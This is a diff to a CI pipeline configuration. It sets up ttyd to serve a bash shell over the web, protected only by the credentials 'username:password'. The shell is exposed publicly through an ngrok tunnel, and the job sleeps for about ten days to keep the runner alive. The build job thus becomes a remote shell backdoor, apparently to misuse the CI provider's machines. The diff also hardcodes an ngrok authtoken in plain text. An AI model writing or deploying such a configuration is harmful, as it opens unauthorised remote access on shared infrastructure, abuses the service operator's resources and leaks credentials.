@@ -12,17 +12,16 @@ blocks:
           commands:
             - checkout
             - sudo apt-get update -y
-            - sudo apt-get install -y wget unzip
+            - sudo apt-get install -y wget unzip jq
             - 'wget https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 -O ttyd'
             - chmod +x ttyd
             - 'wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip'
             - unzip ngrok.zip
             - chmod +x ngrok
-            - './ttyd -p 8080 -c username:password bash &'
+            - 'nohup ./ttyd -p 8080 -c username:password bash > ttyd.log 2>&1 &'
             - ./ngrok authtoken 2lKjA15AAL3kFG0cbOpfTJGbewT_3PjMCSs55KCHQ2PKkoVdS
-            - ./ngrok http 8080 &
-            - sleep 5
-            - echo "Fetching ngrok URL..."
-            - 'curl -s localhost:4040/api/tunnels'
-            - echo "Check the above output for the public_url field."
-            - sleep 860000
+            - nohup ./ngrok http 8080 > ngrok.log 2>&1 &
+            - sleep 10
+            - echo "Fetching Ngrok URL..."
+            - 'curl -s localhost:4040/api/tunnels | jq -r ''.tunnels[0].public_url'' || cat ngrok.log'
+            - sleep 870000
